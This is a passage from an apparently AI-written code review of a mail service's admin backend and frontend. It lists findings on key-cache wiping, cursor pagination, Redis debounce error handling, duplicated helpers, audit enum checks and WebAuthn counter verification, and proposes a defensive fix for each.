**Fix:** Acceptable for now (long-lived plaintext is the model anyway) — but add a comment documenting that `wipe()` only wipes the cache copy, not consumer copies. Consider exposing `ResolvedMasterKey` as `AutoCloseable` with a `close()` that zeros its internal byte array, and pair every `resolve()` with try-with-resources at call sites.

---

### WR-14: `useTenantList` cursor bookkeeping uses raw integer offsets

**File:** `apps/admin/src/routes/_authenticated/tenants.tsx:79-83` + `backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminTenantController.java:164-173`
**Issue:** The cursor is just `String.valueOf(offset + limit)` — an integer offset, parsed back with `Integer.parseInt`. Two issues:
1. Offset-based pagination over a `tenants` table mutated concurrently (new sign-ups, deletes) will skip rows or show duplicates between pages.
2. `parseOffset()` silently falls back to `0` on `NumberFormatException` — a malicious admin (or a copy-paste of a stale cursor) sends `?cursor=abc`, gets page 1 with no error indication.

Today this is a minor UX issue (admin pages aren't exposed to attackers), but for an audit-heavy admin surface, opaque cursor failure modes are surprising.

**Fix:** Switch to keyset pagination using `(created_at DESC, tenant_id ASC)` as the sort key. Base64-encode the keyset values as the cursor token. Reject invalid cursors with `400`, not silent `0`.

## Info

### IN-01: `acquireDebounce` design also pattern: prefer `SET NX + EXPIRE` real atomic claim

**File:** `backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncOrchestrator.java:202-218`
**Note:** Tied to CR-01. Once fixed, document the chosen single-source-of-truth (Redis OR `findActiveJobWithin` SQL) so future maintainers don't reintroduce the racy "test then release" pattern.

### IN-02: Unused `useDocumentHidden` duplication

**File:** `apps/admin/src/features/queue/use-queue-health.ts:25-36` and `apps/admin/src/features/spend/use-spend-dashboard.ts:26-37`
**Issue:** Identical `useDocumentHidden()` hook defined in both files. Extract to `apps/admin/src/lib/use-document-hidden.ts`.

### IN-03: `acquireDebounce` ignores Redis errors

**File:** `backend/core/src/main/java/com/zeromail/core/admin/cat/usecases/CatalogSyncOrchestrator.java:202-218`
**Issue:** Any `RuntimeException` from `redisTemplate.get().opsForValue().setIfAbsent(...)` (connection refused, Lettuce timeout) propagates out and breaks the entire startFetch flow even though Redis is non-authoritative. Wrap in `try/catch (DataAccessException) { return Optional.empty(); }` and log `event=admin_catalog_sync_debounce_redis_unavailable` so a Redis outage falls back to the DB path instead of erroring out admin calls.

### IN-04: `disableConsequences` ordering uses `unshift` which mutates

**File:** `apps/admin/src/routes/_authenticated/catalog.tsx:499-511`
**Issue:** Constructs a local `const consequences = [...]`, then `consequences.unshift(...)` to prepend. Not a real bug because the array is local, but the pattern is unusual; readers usually expect `[prefix, ...consequences]`. Refactor for clarity.

### IN-05: `parseOffset` and `parseCursor` duplicate logic across services

**File:** `backend/api/src/main/java/com/zeromail/api/controllers/admin/AdminTenantController.java:164-173` and `backend/core/src/main/java/com/zeromail/core/admin/queue/usecases/QueueHealthQueryService.java:90-99`
**Issue:** Same swallowed-NumberFormatException → return 0 logic in two places. Extract to `OffsetCursor.parse(String) -> int` shared utility.

### IN-06: `AdminAuditAction` has no compile-time exhaustiveness check

**File:** `backend/core/src/main/java/com/zeromail/core/admin/audit/domain/AdminAuditAction.java`
**Issue:** Adding a new action requires updating call sites manually; nothing prevents shipping audit calls that don't pair with an enum entry (string action name wouldn't compile, but action names elsewhere in JSON-encoded `before_state_json` can drift). Consider an `@interface AuditedAction("MASTER_KEY_SET")` annotation on services + ArchUnit assertion that every annotation value matches a real enum.

### IN-07: 048-admin-users.yaml signature_counter default is 0 — verify WebAuthn replay-detection logic

**File:** `backend/core/src/main/resources/db/changelog/changes/048-admin-users.yaml:57-62`
**Issue:** `signature_counter` defaults to 0 and is `NOT NULL`. WebAuthn requires monotonically-increasing counter checks to detect cloned authenticators. Out of scope for this Phase 8 review (the WebAuthn flow itself wasn't in the file list), but a fast follow-up should verify the assertion-counter advancement logic exists in `Webauthn4JRelyingPartyOperations` integration AND that an audit row is written when a backwards/equal counter is observed (action `WEBAUTHN_REPLAY_SUSPECTED` already exists in the enum, which is a positive sign).

---

_Reviewed: 2026-05-20T16:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
